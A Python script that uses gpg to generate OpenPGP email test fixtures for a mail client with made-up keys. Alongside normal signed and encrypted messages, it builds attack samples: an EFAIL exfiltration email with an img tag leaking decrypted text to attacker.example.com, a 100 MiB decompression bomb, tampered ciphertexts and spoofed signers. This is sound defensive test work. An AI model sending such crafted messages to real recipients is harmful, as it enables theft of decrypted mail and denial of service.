#!/usr/bin/env python3
"""Generate the OpenPGP test fixtures for meron-core with GnuPG.

Every key and address here is made up. The script runs gpg in a throwaway
GNUPGHOME, so it never touches the developer's own keyring. Outputs are
committed; re-running replaces them with fresh (random) ones, which the
tests must accept, so assert on structure and text, never on bytes.

Usage: python3 make_fixtures.py   (from any directory; needs gpg >= 2.2)
"""

from __future__ import annotations

import base64
import os
import shutil
import subprocess
import sys
import tempfile
import zlib
from pathlib import Path

OUT = Path(__file__).resolve().parent
CRLF = "\r\n"

ALICE = "Alice Example <alice@example.org>"  # "us": the Meron account
BOB = "Bob Example <bob@example.net>"  # RSA, passphrase-protected secret
CAROL = "Carol Example <carol@example.com>"  # a peer who writes to us
CAROL_NEW = "Carol Example <carol@example.com>"  # Carol's second (new) key
MALLORY = "Mallory Example <mallory@example.com>"  # signs mail claiming to be Carol
BOB_PASSPHRASE = "correct horse battery staple"


class Gpg:
    """Thin gpg wrapper bound to one throwaway home directory."""

    def __init__(self, home: Path) -> None:
        self.home = home

    def run(self, *args: str, stdin: bytes | None = None, passphrase: str = "") -> bytes:
        cmd = [
            "gpg",
            "--homedir",
            str(self.home),
            "--batch",
            "--yes",
            "--no-tty",
            "--quiet",
            "--pinentry-mode",
            "loopback",
            "--passphrase",
            passphrase,
            "--trust-model",
            "always",
            *args,
        ]
        res = subprocess.run(cmd, input=stdin, capture_output=True, check=False)
        if res.returncode != 0:
            sys.stderr.write(res.stderr.decode(errors="replace"))
            raise SystemExit(f"gpg failed: {' '.join(args)}")
        return res.stdout

    def gen(self, uid: str, primary: str, sub: str | None, passphrase: str = "", faked_time: str | None = None, expire: str = "never") -> str:
        extra = ["--faked-system-time", faked_time] if faked_time else []
        self.run(*extra, "--quick-gen-key", uid, primary, "cert,sign" if sub else "default", expire, passphrase=passphrase)
        fpr = self.fingerprints(uid)[-1]
        if sub:
            self.run(*extra, "--quick-add-key", fpr, sub, "encr", expire, passphrase=passphrase)
        return fpr

    def fingerprints(self, query: str) -> list[str]:
        out = self.run("--with-colons", "--list-keys", query).decode()
        fprs, want = [], False
        for line in out.splitlines():
            f = line.split(":")
            if f[0] == "pub":
                want = True
            elif f[0] == "fpr" and want:
                fprs.append(f[9])
                want = False
        return fprs


def write(name: str, data: bytes | str) -> None:
    (OUT / name).write_bytes(data.encode() if isinstance(data, str) else data)
    print("wrote", name)


def headers(frm: str, to: str, subject: str, extra: list[str] | None = None, msgid: str = "") -> str:
    lines = [
        f"From: {frm}",
        f"To: {to}",
        f"Subject: {subject}",
        "Date: Sun, 01 Nov 2026 10:00:00 +0100",
        f"Message-ID: <{msgid or subject.replace(' ', '-').lower()}@example.com>",
        "MIME-Version: 1.0",
    ]
    return CRLF.join(lines + (extra or [])) + CRLF


def inner_part(subject: str, text: str, frm: str = CAROL, to: str = ALICE) -> str:
    """An RFC 9788 inner part: text/plain with protected headers."""
    return CRLF.join(
        [
            'Content-Type: text/plain; charset="utf-8"; protected-headers="v1"',
            "Content-Transfer-Encoding: 8bit",
            f"Subject: {subject}",
            f"From: {frm}",
            f"To: {to}",
            "",
            text,
            "",
        ]
    )


def pgp_mime(outer_headers: str, armored: bytes, boundary: str = "enc-boundary") -> str:
    return (
        outer_headers
        + f'Content-Type: multipart/encrypted; protocol="application/pgp-encrypted"; boundary="{boundary}"'
        + CRLF
        + CRLF
        + f"--{boundary}{CRLF}"
        + "Content-Type: application/pgp-encrypted"
        + CRLF
        + "Content-Description: PGP/MIME version identification"
        + CRLF
        + CRLF
        + "Version: 1"
        + CRLF
        + CRLF
        + f"--{boundary}{CRLF}"
        + 'Content-Type: application/octet-stream; name="encrypted.asc"'
        + CRLF
        + 'Content-Disposition: inline; filename="encrypted.asc"'
        + CRLF
        + CRLF
        + armored.decode().replace("\n", CRLF)
        + CRLF
        + f"--{boundary}--{CRLF}"
    )


def signed_mime(gpg: Gpg, outer_headers: str, part: str, signer: str, digest: str = "SHA256", boundary: str = "sig-boundary") -> str:
    """RFC 3156 multipart/signed over the exact CRLF bytes of `part`."""
    sig = gpg.run("--local-user", signer, "--digest-algo", digest, "--armor", "--detach-sign", stdin=part.encode())
    return (
        outer_headers
        + f'Content-Type: multipart/signed; micalg=pgp-{digest.lower()}; protocol="application/pgp-signature"; boundary="{boundary}"'
        + CRLF
        + CRLF
        + f"--{boundary}{CRLF}"
        + part
        + CRLF
        + f"--{boundary}{CRLF}"
        + 'Content-Type: application/pgp-signature; name="signature.asc"'
        + CRLF
        + CRLF
        + sig.decode().replace("\n", CRLF)
        + CRLF
        + f"--{boundary}--{CRLF}"
    )


def crc24(data: bytes) -> int:
    crc = 0xB704CE
    for byte in data:
        crc ^= byte << 16
        for _ in range(8):
            crc <<= 1
            if crc & 0x1000000:
                crc ^= 0x1864CFB
    return crc & 0xFFFFFF


def tamper(armored: bytes) -> bytes:
    """Flip one byte deep inside the encrypted packet and re-armor validly."""
    lines = armored.decode().splitlines()
    body = [l for l in lines[1:] if l and not l.startswith("=") and ":" not in l and not l.startswith("-----")]
    raw = bytearray(base64.b64decode("".join(body)))
    raw[len(raw) - 40] ^= 0x01
    b64 = base64.b64encode(bytes(raw)).decode()
    out = ["-----BEGIN PGP MESSAGE-----", ""]
    out += [b64[i : i + 64] for i in range(0, len(b64), 64)]
    out.append("=" + base64.b64encode(crc24(bytes(raw)).to_bytes(3, "big")).decode())
    out.append("-----END PGP MESSAGE-----")
    return ("\n".join(out) + "\n").encode()


def autocrypt_header(gpg: Gpg, addr: str, uid: str) -> str:
    keydata = base64.b64encode(gpg.run("--export", "--export-options", "export-minimal", uid)).decode()
    folded = CRLF.join(" " + keydata[i : i + 76] for i in range(0, len(keydata), 76))
    return f"Autocrypt: addr={addr}; prefer-encrypt=mutual; keydata={CRLF}{folded}"


def main() -> None:
    if not shutil.which("gpg"):
        raise SystemExit("gpg not found")
    home = Path(tempfile.mkdtemp(prefix="meron-pgp-fixtures-"))
    os.chmod(home, 0o700)
    try:
        build(Gpg(home))
    finally:
        subprocess.run(["gpgconf", "--homedir", str(home), "--kill", "all"], check=False, capture_output=True)
        shutil.rmtree(home, ignore_errors=True)


def build(gpg: Gpg) -> None:
    alice = gpg.gen(ALICE, "ed25519", "cv25519")
    bob = gpg.gen(BOB, "rsa3072", "rsa3072", passphrase=BOB_PASSPHRASE)
    carol = gpg.gen(CAROL, "ed25519", "cv25519")
    mallory = gpg.gen(MALLORY, "ed25519", "cv25519")
    # A key created two years ago that expired a year ago, and one that is revoked.
    expired = gpg.gen("Erin Expired <erin@example.com>", "ed25519", "cv25519", faked_time="20240101T000000", expire="1y")
    revoked = gpg.gen("Rex Revoked <rex@example.com>", "ed25519", "cv25519")
    # gpg >= 2.1 writes a revocation certificate for every new key; its armor line is
    # prefixed with ":" so it can't be imported by accident.
    rev_cert = (gpg.home / "openpgp-revocs.d" / f"{revoked}.rev").read_text()
    gpg.run("--import", stdin=rev_cert.replace(":-----BEGIN", "-----BEGIN").encode())

    # Keys -------------------------------------------------------------
    write("alice-secret.asc", gpg.run("--armor", "--export-secret-keys", alice))
    write("alice-public.asc", gpg.run("--armor", "--export", alice))
    write("bob-secret-protected.asc", gpg.run("--armor", "--export-secret-keys", bob, passphrase=BOB_PASSPHRASE))
    write("bob-public.asc", gpg.run("--armor", "--export", bob))
    write("carol-public.asc", gpg.run("--armor", "--export", carol))
    write("mallory-public.asc", gpg.run("--armor", "--export", mallory))
    # Two secret keys in one file: the importer must let the user pick.
    write("two-secret-keys.asc", gpg.run("--armor", "--export-secret-keys", alice, carol))
    # Primary key replaced by a GnuPG stub (what a smartcard or offline-primary export looks like).
    write("alice-secret-subkeys-only.asc", gpg.run("--armor", "--export-secret-subkeys", alice))
    # A contacts keyring as exported from GnuPG: good, expired and revoked keys together.
    write("contacts-keyring.asc", gpg.run("--armor", "--export", bob, carol, mallory, expired, revoked))
    write("contacts-keyring.gpg", gpg.run("--export", bob, carol, mallory))

    # Carol gets a second key later (new device): mail signed by it is a key change.
    gpg.run("--import", stdin=gpg.run("--armor", "--export-secret-keys", carol))
    carol_new_home = Gpg(Path(tempfile.mkdtemp(prefix="meron-pgp-carol2-")))
    os.chmod(carol_new_home.home, 0o700)
    try:
        carol_new = carol_new_home.gen(CAROL_NEW, "ed25519", "cv25519")
        write("carol-new-public.asc", carol_new_home.run("--armor", "--export", carol_new))
        carol_new_home.run("--import", stdin=gpg.run("--armor", "--export", alice))
        part = inner_part("New laptop", "Hi Alice, I'm writing from my new laptop.")
        armored = carol_new_home.run("--local-user", carol_new, "--recipient", alice, "--armor", "--sign", "--encrypt", stdin=part.encode())
        # The new key arrives the way it would in practice: in the Autocrypt header.
        ac = autocrypt_header(carol_new_home, "carol@example.com", carol_new)
        write("key-change.eml", pgp_mime(headers(CAROL, ALICE, "[...]", [ac], msgid="key-change"), armored))
    finally:
        subprocess.run(["gpgconf", "--homedir", str(carol_new_home.home), "--kill", "all"], check=False, capture_output=True)
        shutil.rmtree(carol_new_home.home, ignore_errors=True)

    def enc(part: str, *, sign_as: str | None = carol, to: str = alice, compress: list[str] | None = None) -> bytes:
        args = ["--recipient", to, "--armor", "--encrypt"]
        if sign_as:
            args = ["--local-user", sign_as, "--sign", *args]
        return gpg.run(*(compress or []), *args, stdin=part.encode())

    # Messages ---------------------------------------------------------
    secret = "The meeting moved to Thursday. Bring the blue folder."
    multipart_inner = CRLF.join(
        [
            'Content-Type: multipart/alternative; boundary="alt"; protected-headers="v1"',
            "Subject: Secret plans",
            f"From: {CAROL}",
            f"To: {ALICE}",
            "",
            "--alt",
            'Content-Type: text/plain; charset="utf-8"',
            "",
            secret,
            "--alt",
            'Content-Type: text/html; charset="utf-8"',
            "",
            f"<p>{secret}</p><img src=\"https://tracker.example.com/pixel.png\">",
            "--alt--",
            "",
        ]
    )
    write("enc-signed.eml", pgp_mime(headers(CAROL, ALICE, "[...]", msgid="enc-signed"), enc(multipart_inner)))
    write("enc-unsigned.eml", pgp_mime(headers(CAROL, ALICE, "...", msgid="enc-unsigned"), enc(inner_part("Unsigned secret", secret), sign_as=None)))
    write("enc-wrong-recipient.eml", pgp_mime(headers(CAROL, BOB, "[...]", msgid="wrong-recipient"), enc(inner_part("For Bob", secret), to=bob)))
    write("enc-tampered.eml", pgp_mime(headers(CAROL, ALICE, "[...]", msgid="tampered"), tamper(enc(inner_part("Tampered", secret)))))
    write("enc-signer-mismatch.eml", pgp_mime(headers(CAROL, ALICE, "[...]", msgid="signer-mismatch"), enc(inner_part("From Carol?", secret), sign_as=mallory)))

    with_attachment = CRLF.join(
        [
            'Content-Type: multipart/mixed; boundary="mix"; protected-headers="v1"',
            "Subject: Report attached",
            f"From: {CAROL}",
            f"To: {ALICE}",
            "",
            "--mix",
            'Content-Type: text/plain; charset="utf-8"',
            "",
            "The report is attached.",
            "--mix",
            'Content-Type: text/plain; name="report.txt"',
            'Content-Disposition: attachment; filename="report.txt"',
            "",
            "Quarterly numbers: 1, 2, 3.",
            "--mix--",
            "",
        ]
    )
    write("enc-attachment.eml", pgp_mime(headers(CAROL, ALICE, "[...]", msgid="enc-attachment"), enc(with_attachment)))

    # Inline PGP: the whole text/plain body is an armored, signed and encrypted message.
    inline = enc("Inline secret: the code is 4711.\n")
    write("inline.eml", headers(CAROL, ALICE, "Inline", msgid="inline") + 'Content-Type: text/plain; charset="us-ascii"' + CRLF + CRLF + inline.decode().replace("\n", CRLF))

    # Signed only.
    signed_part = 'Content-Type: text/plain; charset="utf-8"' + CRLF + CRLF + "This message is signed, not encrypted." + CRLF
    write("signed.eml", signed_mime(gpg, headers(CAROL, ALICE, "Signed only", msgid="signed"), signed_part, carol))
    write("signed-sha1.eml", signed_mime(gpg, headers(CAROL, ALICE, "Signed with SHA-1", msgid="signed-sha1"), signed_part, carol, digest="SHA1"))
    write("signed-by-mallory.eml", signed_mime(gpg, headers(CAROL, ALICE, "Signed by someone else", msgid="signed-mallory"), signed_part, mallory))
    # A broken signature: the signed part was changed after signing.
    good = signed_mime(gpg, headers(CAROL, ALICE, "Altered", msgid="signed-altered"), signed_part, carol)
    write("signed-altered.eml", good.replace("signed, not encrypted", "signed, not encrypted!"))
    # Mailing list: signed part wrapped with a footer sibling, plus List-Id.
    inner_signed = signed_mime(gpg, "", signed_part, carol, boundary="inner-sig")
    write(
        "list-footer.eml",
        headers(CAROL, "list@lists.example.com", "List post", ["List-Id: <test.lists.example.com>"], msgid="list-footer")
        + 'Content-Type: multipart/mixed; boundary="list-mix"'
        + CRLF
        + CRLF
        + "--list-mix"
        + CRLF
        + inner_signed
        + CRLF
        + "--list-mix"
        + CRLF
        + 'Content-Type: text/plain; charset="utf-8"'
        + CRLF
        + CRLF
        + "_______________________________________________\r\nTest list footer"
        + CRLF
        + "--list-mix--"
        + CRLF,
    )

    # EFAIL direct exfiltration: attacker HTML wrapped around a stolen ciphertext.
    stolen = enc(inner_part("Stolen", secret))
    efail_enc = pgp_mime("", stolen, boundary="efail-enc")
    write(
        "efail.eml",
        headers(MALLORY, ALICE, "Hello", msgid="efail")
        + 'Content-Type: multipart/mixed; boundary="efail"'
        + CRLF
        + CRLF
        + "--efail"
        + CRLF
        + 'Content-Type: text/html; charset="utf-8"'
        + CRLF
        + CRLF
        + '<img src="https://attacker.example.com/?'
        + CRLF
        + "--efail"
        + CRLF
        + efail_enc
        + CRLF
        + "--efail"
        + CRLF
        + 'Content-Type: text/html; charset="utf-8"'
        + CRLF
        + CRLF
        + '">'
        + CRLF
        + "--efail--"
        + CRLF,
    )

    # Exchange/Outlook "mixed-up" PGP/MIME (Delta Chat repairs it too).
    mixed_up = enc(inner_part("Mixed up", secret))
    write(
        "mixed-up.eml",
        headers(CAROL, ALICE, "[...]", msgid="mixed-up")
        + 'Content-Type: multipart/mixed; boundary="mx"'
        + CRLF
        + CRLF
        + "--mx"
        + CRLF
        + 'Content-Type: text/plain; charset="us-ascii"'
        + CRLF
        + CRLF
        + CRLF
        + "--mx"
        + CRLF
        + "Content-Type: application/pgp-encrypted"
        + CRLF
        + CRLF
        + "Version: 1"
        + CRLF
        + "--mx"
        + CRLF
        + 'Content-Type: application/octet-stream; name="encrypted.asc"'
        + CRLF
        + CRLF
        + mixed_up.decode().replace("\n", CRLF)
        + CRLF
        + "--mx--"
        + CRLF,
    )

    # Decompression bomb: 100 MiB of zeros, zlib level 9, encrypted to Alice.
    bomb_inner = b"Content-Type: text/plain\r\n\r\n" + b"\0" * (100 * 1024 * 1024)
    bomb = gpg.run("--compress-algo", "zlib", "--compress-level", "9", "--recipient", alice, "--armor", "--encrypt", stdin=bomb_inner)
    write("bomb.eml", pgp_mime(headers(MALLORY, ALICE, "[...]", msgid="bomb"), bomb))

    # Plain mail carrying an Autocrypt header (Carol announces her key).
    write(
        "autocrypt-plain.eml",
        headers(CAROL, ALICE, "Hello from Carol", [autocrypt_header(gpg, "carol@example.com", carol)], msgid="autocrypt-plain")
        + 'Content-Type: text/plain; charset="utf-8"'
        + CRLF
        + CRLF
        + "Hi Alice, my mail client supports encryption."
        + CRLF,
    )
    # Autocrypt header whose addr does not match From: must be ignored.
    write(
        "autocrypt-mismatch.eml",
        headers(MALLORY, ALICE, "Hi", [autocrypt_header(gpg, "carol@example.com", mallory)], msgid="autocrypt-mismatch")
        + 'Content-Type: text/plain; charset="utf-8"'
        + CRLF
        + CRLF
        + "Not really Carol."
        + CRLF,
    )
    # Autocrypt on a mailing-list mail: keys ingested, but no offer.
    write(
        "autocrypt-list.eml",
        headers(CAROL, "list@lists.example.com", "List hello", ["List-Id: <test.lists.example.com>", autocrypt_header(gpg, "carol@example.com", carol)], msgid="autocrypt-list")
        + 'Content-Type: text/plain; charset="utf-8"'
        + CRLF
        + CRLF
        + "Posted to a list."
        + CRLF,
    )
    print("fingerprints:", {"alice": alice, "bob": bob, "carol": carol, "mallory": mallory, "expired": expired, "revoked": revoked})


if __name__ == "__main__":
    main()
